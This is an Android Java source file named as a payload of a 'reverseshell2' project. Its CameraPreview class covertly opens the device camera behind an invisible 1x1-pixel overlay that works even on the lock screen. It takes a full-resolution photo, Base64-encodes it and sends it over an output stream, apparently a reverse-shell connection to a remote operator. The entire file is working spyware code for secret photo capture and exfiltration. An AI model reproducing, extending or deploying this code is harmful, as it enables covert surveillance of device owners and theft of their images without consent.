package com.example.reverseshell2.Payloads;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.util.Log;

import android.util.Base64;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;

import java.util.List;


public class CameraPreview {
    private Camera camera;
    private Context context;
    private OutputStream out;
    static String TAG = "cameraPreviewClass";

    public CameraPreview(Context context) {
        try {
            this.context =context;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private android.view.WindowManager windowManager;
    private android.view.SurfaceView surfaceView;
 
    public void startUp(int cameraID, final OutputStream outputStream) {
        this.out = outputStream;
        
        windowManager = (android.view.WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        surfaceView = new android.view.SurfaceView(context);
        
        int type;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            type = android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        } else {
            type = android.view.WindowManager.LayoutParams.TYPE_TOAST;
        }
        
        final android.view.WindowManager.LayoutParams layoutParams = new android.view.WindowManager.LayoutParams(
                1, 1,
                type,
                android.view.WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH 
                        | android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | android.view.WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                        | android.view.WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,
                android.graphics.PixelFormat.TRANSLUCENT
        );
        layoutParams.gravity = android.view.Gravity.LEFT | android.view.Gravity.TOP;
        
        windowManager.addView(surfaceView, layoutParams);
        
        surfaceView.getHolder().addCallback(new android.view.SurfaceHolder.Callback() {
            @Override
            public void surfaceCreated(android.view.SurfaceHolder surfaceHolder) {
                try {
                    camera = Camera.open(cameraID);
                } catch (RuntimeException e) {
                    e.printStackTrace();
                    try {
                        out.write("Failed to open camera\n".getBytes("UTF-8"));
                        out.write("END123\n".getBytes("UTF-8"));
                    } catch (IOException ex) {
                        ex.printStackTrace();
                    }
                    windowManager.removeView(surfaceView);
                    return;
                }
                
                Camera.Parameters parameters = camera.getParameters();
                List<Camera.Size> allSizes = parameters.getSupportedPictureSizes();
                Camera.Size size = allSizes.get(0);
                for (int i = 0; i < allSizes.size(); i++) {
                    if (allSizes.get(i).width > size.width)
                        size = allSizes.get(i);
                }
 
                parameters.setPictureSize(size.width, size.height);
                camera.setParameters(parameters);
                
                try {
                    camera.setPreviewDisplay(surfaceHolder);
                    camera.startPreview();
                } catch (Exception e) {
                    e.printStackTrace();
                }
                
                camera.takePicture(null, null, new Camera.PictureCallback() {
                    @Override
                    public void onPictureTaken(byte[] data, Camera camera) {
                        releaseCamera();
                        windowManager.removeView(surfaceView);
                        sendPhoto(data);
                    }
                });
            }
 
            @Override
            public void surfaceChanged(android.view.SurfaceHolder surfaceHolder, int i, int i1, int i2) {}
 
            @Override
            public void surfaceDestroyed(android.view.SurfaceHolder surfaceHolder) {}
        });
    }

    private void sendPhoto(byte[] data) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, bos);

        byte[] byteArr = bos.toByteArray();
        final String encodedImage = Base64.encodeToString(byteArr, Base64.DEFAULT);
        Thread thread = new Thread(new Runnable(){
                @Override
                public void run() {
                    try {
                        out.write(encodedImage.getBytes("UTF-8"));
                        out.write("END123\n".getBytes("UTF-8"));
                    } catch (Exception e) {
                        Log.e(TAG, e.getMessage());
                    }
                }
            });
            thread.start();
    }

    private void releaseCamera() {
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }
}